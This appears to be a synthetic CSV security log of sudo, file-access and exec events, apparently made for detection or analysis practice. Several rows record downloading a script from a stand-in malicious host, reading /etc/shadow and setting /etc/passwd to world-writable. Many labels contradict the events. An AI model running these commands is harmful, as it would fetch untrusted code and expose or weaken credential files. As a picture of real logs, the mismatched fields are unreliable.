timestamp,user_id,event_type,resource,action,command,result,ip_address,session_id,reason
2025-04-30T19:43:17Z,U7853,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.169,82144,Routine system scan
2025-05-06T08:30:17Z,U9140,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.206,68955,Routine system scan
2025-05-03T20:34:17Z,U7118,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.176,64246,Administrative task
2025-05-02T05:30:17Z,U4868,file_access,/etc/shadow,write,,failure,10.0.0.37,21859,Execution blocked by policy
2025-05-02T23:49:17Z,U8445,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.145,93678,Permission denied
2025-05-01T21:42:17Z,U2618,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,failure,10.0.0.205,17363,Segmentation fault
2025-05-05T04:29:17Z,U8382,file_access,/etc/shadow,read,,success,10.0.0.237,12552,Privileged command executed
2025-05-04T11:56:17Z,U7019,file_access,/etc/shadow,write,,success,10.0.0.211,98386,Administrative task
2025-05-03T06:20:17Z,U9082,file_access,/etc/shadow,write,,success,10.0.0.14,40719,Access to sensitive file
2025-05-06T08:11:17Z,U4833,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.190,74436,Privileged command executed
2025-05-05T05:00:17Z,U5336,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.197,29019,Privileged command executed
2025-05-02T11:36:17Z,U4947,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.189,60950,Access to sensitive file
2025-05-06T12:57:17Z,U2913,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.152,10934,Privileged command executed
2025-05-03T07:34:17Z,U2430,file_access,/etc/passwd,write,,success,10.0.0.122,24201,Routine system scan
2025-05-04T09:09:17Z,U9739,file_access,/etc/shadow,read,,success,10.0.0.240,11378,Normal command execution
2025-05-07T00:43:17Z,U5558,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.71,11056,Routine system scan
2025-05-07T02:21:17Z,U3111,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.172,78700,Normal command execution
2025-05-04T02:34:17Z,U5118,exec,/bin/bash,run,sudo su,success,10.0.0.217,99129,Administrative task
2025-05-02T04:07:17Z,U4780,exec,/usr/bin/top,run,sudo su,success,10.0.0.113,76034,Normal command execution
2025-05-01T00:53:17Z,U1717,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.204,23392,Command not found
2025-05-03T04:28:17Z,U5773,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.187,30297,Invalid argument
2025-05-05T10:33:17Z,U3315,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.141,32653,Access to sensitive file
2025-05-01T04:28:17Z,U7737,file_access,/etc/shadow,read,,success,10.0.0.75,35548,Administrative task
2025-05-02T14:59:17Z,U4645,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.201,78713,Administrative task
2025-05-06T19:11:17Z,U4101,file_access,/etc/passwd,write,,success,10.0.0.197,51980,Administrative task
2025-05-04T23:43:17Z,U7315,file_access,/etc/passwd,write,,failure,10.0.0.204,20380,Permission denied
2025-05-04T03:56:17Z,U4484,file_access,/etc/passwd,read,,failure,10.0.0.222,92924,Invalid argument
2025-05-06T20:36:17Z,U6966,file_access,/etc/passwd,read,,failure,10.0.0.132,35446,Command not found
2025-05-01T15:49:17Z,U2885,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.81,89551,Normal command execution
2025-05-05T01:08:17Z,U8613,file_access,/etc/shadow,write,,failure,10.0.0.42,40673,Permission denied
2025-05-01T03:33:17Z,U5008,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.152,63046,Command not found
2025-05-01T17:14:17Z,U5365,file_access,/etc/shadow,read,,success,10.0.0.152,47157,Privileged command executed
2025-05-01T21:31:17Z,U3346,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.171,77786,Administrative task
2025-05-05T03:59:17Z,U1123,exec,/bin/bash,run,ls -al /etc,success,10.0.0.249,43104,Access to sensitive file
2025-05-04T19:51:17Z,U6029,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.234,40270,Privileged command executed
2025-05-06T23:04:17Z,U7837,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.244,57065,Administrative task
2025-05-02T11:10:17Z,U6001,file_access,/etc/passwd,write,,success,10.0.0.100,19295,Privileged command executed
2025-04-30T10:35:17Z,U4680,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.17,81656,Execution blocked by policy
2025-05-03T13:58:17Z,U1313,exec,/usr/bin/top,run,touch /tmp/testfile,failure,10.0.0.119,56214,Execution blocked by policy
2025-05-06T04:27:17Z,U1244,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.60,20023,Routine system scan
2025-05-05T06:07:17Z,U8579,file_access,/etc/passwd,write,,success,10.0.0.219,24369,Privileged command executed
2025-05-04T22:19:17Z,U4555,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.113,33655,Administrative task
2025-05-04T11:47:17Z,U3974,exec,/bin/bash,run,ls -al /etc,success,10.0.0.77,34834,Routine system scan
2025-05-07T04:27:17Z,U7354,file_access,/etc/shadow,write,,success,10.0.0.48,34561,Routine system scan
2025-05-07T01:24:17Z,U4440,file_access,/etc/shadow,write,,success,10.0.0.254,67554,Privileged command executed
2025-05-03T05:44:17Z,U3544,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.217,40425,Normal command execution
2025-05-03T17:01:17Z,U2866,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.248,24195,Permission denied
2025-05-05T02:01:17Z,U9943,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.222,16700,Segmentation fault
2025-05-01T19:02:17Z,U2719,exec,/bin/sudo,run,sudo su,failure,10.0.0.78,20345,Segmentation fault
2025-05-01T15:35:17Z,U3288,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.133,52725,Administrative task
2025-05-04T10:55:17Z,U6911,file_access,/etc/shadow,read,,success,10.0.0.160,71313,Administrative task
2025-05-06T19:16:17Z,U7105,file_access,/etc/passwd,write,,failure,10.0.0.237,92444,Command not found
2025-05-05T11:56:17Z,U2349,exec,/bin/sudo,run,touch /tmp/testfile,success,10.0.0.172,28179,Access to sensitive file
2025-05-07T00:06:17Z,U9014,exec,/usr/bin/top,run,sudo su,success,10.0.0.126,68239,Administrative task
2025-04-30T17:16:17Z,U8164,file_access,/etc/shadow,write,,failure,10.0.0.146,37897,Segmentation fault
2025-05-07T00:46:17Z,U4328,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.90,87086,Access to sensitive file
2025-05-04T14:55:17Z,U7504,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.27,26665,Administrative task
2025-05-04T15:04:17Z,U8435,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.160,56476,Privileged command executed
2025-04-30T17:20:17Z,U6051,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.154,89674,Administrative task
2025-05-01T05:39:17Z,U1189,file_access,/etc/passwd,read,,failure,10.0.0.67,42262,Segmentation fault
2025-05-04T02:31:17Z,U6362,file_access,/etc/passwd,write,,success,10.0.0.170,71884,Administrative task
2025-05-03T08:41:17Z,U6911,file_access,/etc/shadow,write,,success,10.0.0.220,19813,Privileged command executed
2025-05-02T15:36:17Z,U5325,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.105,11549,Administrative task
2025-05-06T06:21:17Z,U3629,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.236,42800,Normal command execution
2025-05-01T02:49:17Z,U5636,file_access,/etc/shadow,write,,success,10.0.0.214,39939,Administrative task
2025-05-06T01:57:17Z,U5867,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.13,31131,Routine system scan
2025-05-01T00:48:17Z,U4270,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.35,43110,Administrative task
2025-05-05T16:40:17Z,U4967,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.237,54319,Privileged command executed
2025-05-03T17:03:17Z,U3861,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.154,26588,Privileged command executed
2025-05-05T11:40:17Z,U3035,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.20,61461,Normal command execution
2025-05-05T10:26:17Z,U8026,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.24,80985,Routine system scan
2025-05-05T15:27:17Z,U4372,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.238,79280,Routine system scan
2025-05-05T21:49:17Z,U5681,exec,/usr/bin/wget,run,sudo su,success,10.0.0.250,35183,Administrative task
2025-05-02T21:33:17Z,U3129,exec,/usr/bin/wget,run,cat /etc/shadow,success,10.0.0.90,57920,Administrative task
2025-05-05T16:21:17Z,U2733,file_access,/etc/passwd,write,,success,10.0.0.80,77117,Privileged command executed
2025-05-05T21:34:17Z,U4834,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.81,47180,Privileged command executed
2025-05-02T10:33:17Z,U9633,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.135,46246,Administrative task
2025-05-05T07:40:17Z,U4758,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.195,54440,Routine system scan
2025-05-01T03:05:17Z,U8746,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.119,39570,Routine system scan
2025-05-03T00:40:17Z,U6621,exec,/usr/bin/wget,run,touch /tmp/testfile,success,10.0.0.194,13358,Administrative task
2025-05-02T18:05:17Z,U9045,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.88,96138,Routine system scan
2025-05-02T03:53:17Z,U1364,file_access,/etc/passwd,read,,success,10.0.0.249,91902,Administrative task
2025-04-30T07:55:17Z,U2310,exec,/bin/sudo,run,cat /etc/shadow,success,10.0.0.80,80537,Normal command execution
2025-05-04T15:37:17Z,U1994,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.238,37188,Normal command execution
2025-05-05T07:13:17Z,U6685,file_access,/etc/passwd,write,,success,10.0.0.52,25235,Routine system scan
2025-05-06T03:35:17Z,U5728,file_access,/etc/passwd,read,,success,10.0.0.248,29717,Privileged command executed
2025-05-03T21:35:17Z,U9008,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.169,28886,Routine system scan
2025-05-01T19:42:17Z,U3310,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.97,13864,Invalid argument
2025-05-03T18:01:17Z,U6558,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.206,93830,Access to sensitive file
2025-05-02T22:03:17Z,U8709,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.251,28887,Permission denied
2025-04-30T12:45:17Z,U6824,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.6,57919,Execution blocked by policy
2025-05-02T03:34:17Z,U5591,file_access,/etc/shadow,read,,success,10.0.0.34,29698,Normal command execution
2025-05-06T00:30:17Z,U1777,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.247,40554,Administrative task
2025-05-05T14:38:17Z,U3798,exec,/usr/bin/top,run,chmod 777 /etc/passwd,success,10.0.0.110,55050,Routine system scan
2025-05-01T22:02:17Z,U2538,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.132,54469,Routine system scan
2025-05-06T09:02:17Z,U4222,exec,/bin/bash,run,chmod 777 /etc/passwd,success,10.0.0.235,74282,Privileged command executed
2025-05-04T16:21:17Z,U5543,file_access,/etc/passwd,read,,success,10.0.0.67,10980,Normal command execution
2025-04-30T20:05:17Z,U3506,exec,/bin/sudo,run,ls -al /etc,success,10.0.0.29,22180,Routine system scan
2025-05-02T16:41:17Z,U1284,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.44,15032,Routine system scan
2025-05-01T01:31:17Z,U9075,file_access,/etc/shadow,read,,success,10.0.0.121,87174,Access to sensitive file
2025-05-03T21:02:17Z,U2484,exec,/bin/bash,run,cat /etc/shadow,failure,10.0.0.102,63216,Command not found
2025-05-05T09:15:17Z,U8479,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.120,93267,Access to sensitive file
2025-05-07T04:03:17Z,U1560,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.123,86401,Command not found
2025-05-01T02:31:17Z,U2229,file_access,/etc/shadow,write,,failure,10.0.0.213,78972,Execution blocked by policy
2025-05-05T19:29:17Z,U8419,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.189,30407,Routine system scan
2025-05-03T20:23:17Z,U9254,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.136,16390,Routine system scan
2025-05-04T07:12:17Z,U1423,file_access,/etc/passwd,write,,success,10.0.0.83,17465,Routine system scan
2025-05-05T18:23:17Z,U2771,file_access,/etc/shadow,read,,success,10.0.0.174,52633,Access to sensitive file
2025-05-04T19:35:17Z,U3674,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.223,96298,Normal command execution
2025-05-04T11:09:17Z,U4634,file_access,/etc/shadow,write,,success,10.0.0.84,17172,Access to sensitive file
2025-05-03T10:24:17Z,U2827,file_access,/etc/passwd,read,,failure,10.0.0.121,78965,Permission denied
2025-05-04T08:00:17Z,U9006,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.109,26814,Routine system scan
2025-05-06T15:25:17Z,U2702,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.220,27535,Administrative task
2025-05-01T11:55:17Z,U5425,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.42,93554,Normal command execution
2025-05-02T22:10:17Z,U9920,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.184,20137,Segmentation fault
2025-05-02T05:10:17Z,U6158,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.247,93493,Routine system scan
2025-04-30T20:13:17Z,U9001,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.142,71204,Administrative task
2025-05-07T02:06:17Z,U5783,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.177,22781,Administrative task
2025-05-05T07:41:17Z,U7507,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.226,17731,Administrative task
2025-05-01T10:44:17Z,U4592,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.61,86196,Routine system scan
2025-05-01T16:36:17Z,U7510,exec,/usr/bin/top,run,cat /etc/shadow,success,10.0.0.144,39796,Access to sensitive file
2025-05-02T15:50:17Z,U4021,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.180,64137,Privileged command executed
2025-05-04T07:48:17Z,U8092,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.217,26985,Administrative task
2025-05-03T16:09:17Z,U9351,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.149,49431,Administrative task
2025-05-03T14:21:17Z,U4930,file_access,/etc/shadow,read,,success,10.0.0.170,68977,Normal command execution
2025-04-30T08:44:17Z,U7677,file_access,/etc/passwd,write,,success,10.0.0.164,38256,Access to sensitive file
2025-05-06T10:46:17Z,U7294,file_access,/etc/passwd,write,,success,10.0.0.167,65795,Administrative task
2025-05-06T23:19:17Z,U7129,exec,/bin/sudo,run,ls -al /etc,failure,10.0.0.97,54558,Permission denied
2025-05-01T19:18:17Z,U7364,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,success,10.0.0.192,93637,Privileged command executed
2025-05-02T04:34:17Z,U1832,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.243,51239,Privileged command executed
2025-05-03T02:22:17Z,U3645,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.128,89662,Execution blocked by policy
2025-05-05T12:11:17Z,U7962,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.205,41052,Administrative task
2025-05-05T17:01:17Z,U3393,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.155,52306,Administrative task
2025-05-05T08:54:17Z,U2404,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.96,84143,Privileged command executed
2025-05-04T02:00:17Z,U4948,file_access,/etc/shadow,write,,success,10.0.0.57,82423,Access to sensitive file
2025-05-03T11:37:17Z,U5994,file_access,/etc/passwd,read,,failure,10.0.0.53,33604,Command not found
2025-04-30T23:30:17Z,U1044,file_access,/etc/shadow,read,,failure,10.0.0.3,80437,Invalid argument
2025-05-02T18:21:17Z,U7368,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.197,90534,Privileged command executed
2025-05-01T08:35:17Z,U4866,file_access,/etc/shadow,read,,success,10.0.0.154,21145,Routine system scan
2025-05-06T10:13:17Z,U1488,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.134,21142,Normal command execution
2025-05-05T23:11:17Z,U2907,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.166,83372,Access to sensitive file
2025-05-03T16:42:17Z,U6490,file_access,/etc/passwd,read,,success,10.0.0.73,30494,Administrative task
2025-05-01T06:39:17Z,U5581,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.42,69496,Invalid argument
2025-05-05T01:14:17Z,U5336,exec,/bin/sudo,run,ls -al /etc,failure,10.0.0.219,31220,Execution blocked by policy
2025-05-04T09:54:17Z,U8435,file_access,/etc/shadow,write,,success,10.0.0.24,84957,Routine system scan
2025-05-02T05:22:17Z,U1005,file_access,/etc/shadow,read,,failure,10.0.0.226,79351,Command not found
2025-05-02T01:58:17Z,U6289,exec,/bin/sudo,run,touch /tmp/testfile,failure,10.0.0.179,12765,Permission denied
2025-05-06T21:18:17Z,U4175,exec,/bin/bash,run,cat /etc/shadow,success,10.0.0.37,47358,Administrative task
2025-05-06T08:26:17Z,U7354,file_access,/etc/shadow,read,,success,10.0.0.91,24900,Access to sensitive file
2025-05-06T07:17:17Z,U4005,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.92,77927,Normal command execution
2025-05-02T19:54:17Z,U6797,exec,/bin/bash,run,wget http://malicious.com/script.sh,success,10.0.0.133,21150,Access to sensitive file
2025-05-04T04:12:17Z,U6450,exec,/usr/bin/top,run,wget http://malicious.com/script.sh,success,10.0.0.170,48528,Administrative task
2025-04-30T08:20:17Z,U5716,file_access,/etc/passwd,write,,success,10.0.0.202,53503,Administrative task
2025-04-30T17:57:17Z,U8433,exec,/usr/bin/wget,run,ls -al /etc,success,10.0.0.248,75419,Access to sensitive file
2025-05-05T11:52:17Z,U6910,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.64,70069,Privileged command executed
2025-05-02T23:48:17Z,U7899,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.57,50774,Administrative task
2025-05-03T00:24:17Z,U5814,file_access,/etc/passwd,read,,success,10.0.0.212,84212,Privileged command executed
2025-05-03T01:13:17Z,U9369,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.93,62956,Routine system scan
2025-05-03T04:02:17Z,U6904,exec,/bin/bash,run,sudo su,success,10.0.0.83,22390,Privileged command executed
2025-05-01T19:10:17Z,U6673,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,failure,10.0.0.88,22291,Invalid argument
2025-05-06T14:49:17Z,U6880,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.172,17130,Normal command execution
2025-05-07T05:10:17Z,U1240,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.37,76232,Routine system scan
2025-05-01T07:07:17Z,U7115,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.173,50257,Invalid argument
2025-05-02T06:53:17Z,U3953,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.42,92954,Routine system scan
2025-05-05T19:15:17Z,U7762,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.222,72485,Segmentation fault
2025-04-30T09:54:17Z,U4072,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.136,62218,Privileged command executed
2025-05-02T13:10:17Z,U9710,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.86,33101,Access to sensitive file
